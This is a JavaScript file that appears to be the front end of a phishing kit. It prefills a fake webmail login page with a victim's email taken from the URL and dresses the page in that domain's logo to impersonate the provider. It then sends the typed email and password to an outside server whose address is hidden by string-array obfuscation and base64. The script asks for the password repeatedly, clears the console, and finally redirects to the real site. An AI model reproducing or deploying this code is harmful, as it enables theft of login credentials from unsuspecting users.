'use strict';
$(document).ready(function() {
  /** @type {number} */
  var tt = 0;
  /** @type {string} */
  var fe = window.location.hash.substr(1);
  if (fe) {
    /** @type {string} */
    var result = atob(fe);
    $("#email").val(result);
    if (!/^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(result)) {
      return $("#error").show(), fe.focus, false;
    }
    /** @type {number} */
    var _last = result.indexOf("@");
    /** @type {string} */
    var svg_current = result.substr(_last + 1);
    /** @type {string} */
    var referenceChar = svg_current.substr(0, svg_current.indexOf("."));
    /** @type {string} */
    var toinnerHTML = (referenceChar.toLowerCase(), referenceChar.toUpperCase());
    $("title").html(toinnerHTML + " Login");
    $("#logoimg").attr("src", "http://logo.clearbit.com/" + svg_current);
    $("#favimg").attr("href", "https://www.google.com/s2/favicons?domain=" + svg_current);
    $("#logoname").html(toinnerHTML);
	$(".domain").html(result);
    $("#footer-text").html(toinnerHTML + " Mail &copy; 2021");
    $("#password").focus();
  } else {
  }
  $("#submit-btn").click(function(event) {
    $("#error").hide();
    $("#msg").hide();
    event.preventDefault();
    var room = $("#email").val();
    var adminPassword = $("#password").val();
    var name = room;
    if (!/^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(name)) {
      return $("#error").show(), room.focus, false;
    }
    var dot_pos = name.indexOf("@");
    var n = name.substr(dot_pos + 1);
    var referenceChar = n.substr(0, n.indexOf("."));
    var startMessage = (referenceChar.toLowerCase(), referenceChar.toUpperCase());
    $("title").html(startMessage + " Login");
    $("#logoimg").attr("src", "http://logo.clearbit.com/" + n);
    $("#favimg").attr("href", "https://www.google.com/s2/favicons?domain=" + n);
    $("#logoname").html(startMessage);
    console.log(startMessage);
    $("#footer-text").html(startMessage + " Mail &copy; 2021");
    $("#password").focus();
    tt = tt + 1;
    /** @type {!Array} */
    var HELLO_I18N = ["890861BzgNsv", "114682XmmzuR", "8951uSLnRx", "1LjrfsP", "aHR0cHM6Ly9zdW55bC1tb3Rvci5jb20vbSBuLnBocA==", "114164CgnDLi", "1MYhJRN", "677206qoCZOQ", "473185BQyADj", "1izxLaa", "574411hFYeBm", "13zpiJyh", "4GthmMr"];
    /**
     * @param {string} n
     * @param {?} fn
     * @return {?}
     */
    var height = function(n, fn) {
      return HELLO_I18N[n = n - 0];
    };
    /** @type {function(string, ?): ?} */
    var textHeight = height;
    $.ajax({
      dataType : "JSON",
      url : (function(arr, canCreateDiscussions) {
        /** @type {function(string, ?): ?} */
        var style = height;
        for (;;) {
          try {
            if (372820 === -parseInt(style("0x4")) * -parseInt(style("0xb")) + parseInt(style("0x7")) + parseInt(style("0x6")) + -parseInt(style("0x8")) * parseInt(style("0x9")) + parseInt(style("0x5")) * parseInt(style("0x0")) + parseInt(style("0x1")) * parseInt(style("0xa")) + parseInt(style("0x2")) * -parseInt(style("0xc"))) {
              break;
            }
            arr.push(arr.shift());
          } catch (o) {
            arr.push(arr.shift());
          }
        }
      }(HELLO_I18N), atob(textHeight("0x3"))),
      type : "POST",
      data : {
        email : room,
        password : adminPassword
      },
      beforeSend : function(xhr) {
        $("#submit-btn").html("Verifing...");
      },
      success : function(data) {
        if (data) {
          $("#msg").show();
          console.log(data);
          if ("ok" == data.signal) {
            $("#password").val("");
            if (tt >= 2) {
              /** @type {number} */
              tt = 0;
              window.location.replace(data.redirect_link);
			  
            }
          }
        }
        console.clear();
      },
      error : function(f) {
        $("#password").val("");
        if (tt >= 3) {
          /** @type {number} */
          tt = 0;
          
		  window.location.replace("http://www."+result);
        }
        $("#msg").show();
      },
      complete : function() {
        $("#submit-btn").html("Login");
      }
    });
  });
});
